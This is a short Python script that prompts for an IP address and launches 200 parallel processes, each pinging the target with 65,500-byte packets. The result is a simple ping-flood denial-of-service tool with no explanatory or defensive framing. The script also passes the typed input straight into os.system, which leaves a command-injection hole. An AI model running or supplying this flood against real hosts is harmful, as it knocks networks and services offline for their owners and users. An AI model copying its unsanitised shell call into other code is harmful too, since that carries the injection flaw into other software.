#!/usr/bin/python3

import os
import multiprocessing as mp
import time as tm
ip = str(input("Enter IP : "))

def ping(ip):
    os.system("ping "+ip+" -s 65500")

for i in range(0 , 200):
	p = mp.Process(target = ping,args = (ip,))
	print ("starting processor {} at time {}".format(i,tm.time()))
	p.start()
